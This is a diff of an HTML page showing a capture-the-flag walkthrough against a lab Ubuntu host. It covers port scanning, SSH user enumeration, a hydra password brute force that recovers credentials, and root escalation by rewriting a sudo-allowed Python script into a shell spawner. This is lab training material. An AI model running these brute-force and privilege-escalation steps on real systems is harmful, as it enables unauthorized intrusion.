@@ -122,13 +122,13 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">2p2</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu2</span><span class="p">.</span><span class="nc">8</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">18</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
+<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ searchsploit openssh 7.2p2
+<div class="codehilite"><pre><span></span><code>└─$ searchsploit openssh 7.2p2
 ------------------------------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                                          |  Path
 ------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -136,60 +136,60 @@ OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                     
 OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                                          | linux/remote/45210.py
 OpenSSH 7.2 - Denial of Service                                                                                         | linux/dos/40888.py
 OpenSSH 7.2p2 - Username Enumeration                                                                                    | linux/remote/40136.py
-OpenSSH &lt; 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                    | linux/local/40962.txt
+OpenSSH &lt; 7.4 - &#39;UsePrivilegeSeparation Disabled&#39; Forwarded Unix Domain Sockets Privilege Escalation                    | linux/local/40962.txt
 OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                | linux/remote/40963.txt
 OpenSSH &lt; 7.7 - User Enumeration (2)                                                                                    | linux/remote/45939.py
 OpenSSHd 7.2p2 - Username Enumeration   
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>msf auxiliary(scanner/ssh/ssh_enumusers) &gt; set rhosts 10.66.174.57
-rhosts =&gt; 10.66.174.57
-msf auxiliary(scanner/ssh/ssh_enumusers) &gt; run
-[*] 10.66.174.57:22 - SSH - Using malformed packet technique
-[*] 10.66.174.57:22 - SSH - Checking for false positives
-[-] 10.66.174.57:22 - SSH - throws false positive results. Aborting.
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="c">msf auxiliary(scanner/ssh/ssh_enumusers) </span><span class="nv">&gt;</span><span class="c"> set rhosts 10</span><span class="nt">.</span><span class="c">66</span><span class="nt">.</span><span class="c">174</span><span class="nt">.</span><span class="c">57</span>
+<span class="c">rhosts =</span><span class="nv">&gt;</span><span class="c"> 10</span><span class="nt">.</span><span class="c">66</span><span class="nt">.</span><span class="c">174</span><span class="nt">.</span><span class="c">57</span>
+<span class="c">msf auxiliary(scanner/ssh/ssh_enumusers) </span><span class="nv">&gt;</span><span class="c"> run</span>
+<span class="k">[</span><span class="c">*</span><span class="k">]</span><span class="c"> 10</span><span class="nt">.</span><span class="c">66</span><span class="nt">.</span><span class="c">174</span><span class="nt">.</span><span class="c">57:22 </span><span class="nb">-</span><span class="c"> SSH </span><span class="nb">-</span><span class="c"> Using malformed packet technique</span>
+<span class="k">[</span><span class="c">*</span><span class="k">]</span><span class="c"> 10</span><span class="nt">.</span><span class="c">66</span><span class="nt">.</span><span class="c">174</span><span class="nt">.</span><span class="c">57:22 </span><span class="nb">-</span><span class="c"> SSH </span><span class="nb">-</span><span class="c"> Checking for false positives</span>
+<span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> 10</span><span class="nt">.</span><span class="c">66</span><span class="nt">.</span><span class="c">174</span><span class="nt">.</span><span class="c">57:22 </span><span class="nb">-</span><span class="c"> SSH </span><span class="nb">-</span><span class="c"> throws false positive results</span><span class="nt">.</span><span class="c"> Aborting</span><span class="nt">.</span>
+<span class="k">[</span><span class="c">*</span><span class="k">]</span><span class="c"> Scanned 1 of 1 hosts (100% complete)</span>
+<span class="k">[</span><span class="c">*</span><span class="k">]</span><span class="c"> Auxiliary module execution completed</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>hydra -t 20 -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.66.174.57
+<div class="codehilite"><pre><span></span><code><span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">meliodas</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="nl">ssh</span><span class="p">:</span><span class="o">//</span><span class="mf">10.66.174.57</span>
 
-[22][ssh] host: 10.66.174.57   login: meliodas   password: iloveyou1
-1 of 1 target successfully completed, 1 valid password found
-</code></pre>
+<span class="o">[</span><span class="n">22</span><span class="o">][</span><span class="n">ssh</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="mf">10.66.174.57</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="n">meliodas</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="n">iloveyou1</span>
+<span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">found</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>meliodas@ubuntu:~$ cat user.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">meliodas</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>meliodas@ubuntu:~$ cat bak.py
-#!/usr/bin/env python
-import os
-import zipfile
+<div class="codehilite"><pre><span></span><code><span class="n">meliodas</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">bak</span><span class="o">.</span><span class="n">py</span>
+<span class="c1">#!/usr/bin/env python</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">zipfile</span>
 
-def zipdir(path, ziph):
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            ziph.write(os.path.join(root, file))
+<span class="k">def</span><span class="w"> </span><span class="nf">zipdir</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">ziph</span><span class="p">):</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">root</span><span class="p">,</span><span class="w"> </span><span class="n">dirs</span><span class="p">,</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">files</span><span class="p">:</span>
+<span class="w">            </span><span class="n">ziph</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span><span class="w"> </span><span class="n">file</span><span class="p">))</span>
 
-if __name__ == '__main__':
-    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
-    zipdir('/var/www/html', zipf)
-    zipf.close()
-meliodas@ubuntu:~$ sudo -l
-Matching Defaults entries for meliodas on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<span class="k">if</span><span class="w"> </span><span class="vm">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="w">    </span><span class="n">zipf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">&#39;/var/backups/website.zip&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
+<span class="w">    </span><span class="n">zipdir</span><span class="p">(</span><span class="s1">&#39;/var/www/html&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">zipf</span><span class="p">)</span>
+<span class="w">    </span><span class="n">zipf</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">meliodas</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">meliodas</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">ubuntu</span><span class="p">:</span>
+<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span><span class="w"> </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>
 
-User meliodas may run the following commands on ubuntu:
-    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
-</code></pre>
+<span class="n">User</span><span class="w"> </span><span class="n">meliodas</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">ubuntu</span><span class="p">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="n">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">*</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">meliodas</span><span class="o">/</span><span class="n">bak</span><span class="o">.</span><span class="n">py</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>meliodas@ubuntu:~$ echo 'import pty;pty.spawn(&quot;/bin/bash&quot;)' &gt; bak.py
-meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
-root@ubuntu:~# cd /root
-root@ubuntu:/root# ls
-root.txt
-root@ubuntu:/root# cat root.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">meliodas</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">bak</span><span class="o">.</span><span class="n">py</span>
+<span class="n">meliodas</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">meliodas</span><span class="o">/</span><span class="n">bak</span><span class="o">.</span><span class="n">py</span>
+<span class="n">root</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~</span><span class="c1"># cd /root</span>
+<span class="n">root</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="c1"># ls</span>
+<span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">root</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="c1"># cat root.txt</span>
+</code></pre></div>
         </div>
     </main>
 
